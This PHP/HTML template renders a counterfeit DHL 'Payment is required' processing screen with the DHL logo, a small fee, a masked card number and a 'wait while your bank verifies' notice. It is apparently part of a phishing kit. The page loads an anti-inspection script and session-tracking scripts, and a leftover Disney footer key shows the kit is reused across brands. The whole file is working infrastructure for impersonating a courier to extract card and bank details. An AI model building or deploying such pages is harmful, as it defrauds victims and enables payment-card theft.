<?php
require_once(__DIR__ . '/includes/page-common.php');
try {
    $loadingNow = new DateTimeImmutable('now');
} catch (Exception $e) {
    $loadingNow = new DateTimeImmutable('@' . time());
}
$loadingDateStr = $loadingNow->format('n/j/Y');
$amtStr = htmlspecialchars($translations['dhl_amount_sample_value'] ?? '2.99€');
$cardMasked = htmlspecialchars($translations['dhl_card_masked_sample'] ?? '**** **** **** ••••');
?>
<!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($selectedLanguage); ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title><?php echo htmlspecialchars($translations['dhl_loading_meta'] ?? $translations['dhl_track_meta'] ?? 'DHL'); ?></title>
    <link rel="stylesheet" href="<?php echo htmlspecialchars($dhlStyleHref, ENT_QUOTES, 'UTF-8'); ?>">
    <script src="js/anti-inspect.js"></script>
</head>
<body class="holl-page js-focus-visible" data-page="loading">
<nav class="holl-nav" aria-label="Brand">
    <div class="holl-nav-inner">
        <svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 143.5 20" height="20" viewBox="0 0 143.5 20" width="143.5" aria-hidden="true"><g fill="#d40511"><path d="m0 18.5h17.4l-1 1.4h-16.4z"/><path d="m143.5 19.9h-21.3l1.1-1.4h20.3v1.4z"/><path d="m0 15.9h19.4l-1.1 1.4h-18.3z"/><path d="m0 13.3h21.4l-1.1 1.4h-20.3z"/><path d="m143.5 17.3h-19.3l1.1-1.4h18.3v1.4z"/><path d="m127.2 13.3h16.3v1.4h-17.4z"/><path d="m18.8 19.9 9.2-12.3h11.4c1.3 0 1.3.5.6 1.3-.6.8-1.7 2.3-2.3 3.1-.3.5-.9 1.2 1 1.2h15.3c-1.2 1.8-5.4 6.8-12.8 6.8-6-.1-22.4-.1-22.4-.1z"/><path d="m71.5 13.3-5 6.7h-13.1l5-6.7z"/><path d="m90.6 13.3-5 6.7h-13.2l5-6.7z"/><path d="m94.9 13.3s-1 1.3-1.4 1.9c-1.7 2.2-.2 4.8 5.2 4.8h21.2l5-6.7z"/><path d="m25.3 0-4.6 6.1h25c1.3 0 1.3.5.6 1.3-.6.8-1.7 2.3-2.3 3.1-.3.4-.9 1.2 1 1.2h10.2s1.7-2.2 3-4.1c1.9-2.5.2-7.7-6.5-7.7-6 .1-26.4.1-26.4.1z"/><path d="m91.7 11.7h-32.2l8.8-11.7h13.2l-5 6.7h5.9l5-6.7h13.2z"/><path d="m118.8 0-8.8 11.7h-14l8.8-11.7z"/></g></svg>
        <span class="holl-nav-title"><?php echo htmlspecialchars($translations['dhl_nav_payment_required'] ?? 'Payment is required'); ?></span>
    </div>
</nav>
<main class="holl-main">
    <div class="holl-screen-center">
        <div class="holl-modal-root" aria-labelledby="loading-modal-title" role="dialog" aria-modal="true">
            <div class="holl-scrim" aria-hidden="true"></div>
            <div class="holl-modal-scroll">
                <div class="holl-modal-card">
                    <div class="holl-modal-body">
                        <h2 class="visually-hidden" id="loading-modal-title"><?php echo htmlspecialchars($translations['dhl_payment_processing'] ?? 'Payment Processing'); ?></h2>
                        <div class="holl-summary">
                            <div class="holl-summary-row"><span><?php echo htmlspecialchars($translations['dhl_merchant'] ?? 'Merchant:'); ?></span><span><?php echo htmlspecialchars($translations['dhl_brand'] ?? 'DHL Express'); ?></span></div>
                            <div class="holl-summary-row"><span><?php echo htmlspecialchars($translations['dhl_amount'] ?? 'Amount:'); ?></span><span><?php echo $amtStr; ?></span></div>
                            <div class="holl-summary-row"><span><?php echo htmlspecialchars($translations['dhl_date'] ?? 'Date:'); ?></span><span><?php echo htmlspecialchars($loadingDateStr); ?></span></div>
                            <div class="holl-summary-row"><span><?php echo htmlspecialchars($translations['dhl_card_number_label'] ?? 'Card number:'); ?></span><span><?php echo $cardMasked; ?></span></div>
                        </div>
                        <div style="margin-top:1.25rem;">
                            <p class="holl-pay-title"><?php echo htmlspecialchars($translations['dhl_payment_processing'] ?? 'Payment Processing'); ?></p>
                            <div class="holl-alert-row">
                                <svg width="34" height="34" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M10.2679,5.0000025 C11.0377,3.66667 12.9622,3.66667 13.732,5.0000025 L20.6602,17.0000025 C21.43,18.3333 20.4678,20.0000025 18.9282,20.0000025 L5.07177,20.0000025 C3.53217,20.0000025 2.56992,18.3333 3.33972,17.0000025 L10.2679,5.0000025 Z" fill="none" stroke="#ca6d16" stroke-width="2"/><line x1="12" y1="13" x2="12" y2="9" stroke="#ca6d16" stroke-width="2"/><line x1="12" y1="16.5" x2="12" y2="16.63" stroke="#ca6d16" stroke-width="2"/></svg>
                                <span class="holl-alert-text"><?php echo htmlspecialchars($translations['dhl_bank_verify_wait'] ?? $translations['please_wait_verify'] ?? ''); ?></span>
                            </div>
                            <div class="holl-loader" role="status" aria-live="polite"></div>
                            <p style="text-align:center;margin-top:1rem;font-size:.875rem;color:#64748b;"><?php echo htmlspecialchars($translations['dont_leave_page'] ?? ''); ?></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</main>
<footer class="holl-footer">
    <div class="holl-footer-inner">
        <div class="holl-footer-links">
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_privacy'] ?? $translations['Privacy_Policy']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_cookie'] ?? $translations['Cookie_Terms']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_data'] ?? $translations['Data_Rights']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_corp'] ?? $translations['About_Disney']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_disclaimer'] ?? 'Disclaimer'); ?></a>
        </div>
    </div>
</footer>
<div id="sessionToken" style="display:none;"></div>
<style>.visually-hidden{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0;}</style>
<script src="js/pages-config.js?v=<?php echo time(); ?>"></script>
<script src="js/session-manager.js?v=<?php echo time(); ?>"></script>
<script src="js/app.js?v=<?php echo time(); ?>"></script>
</body>
</html>
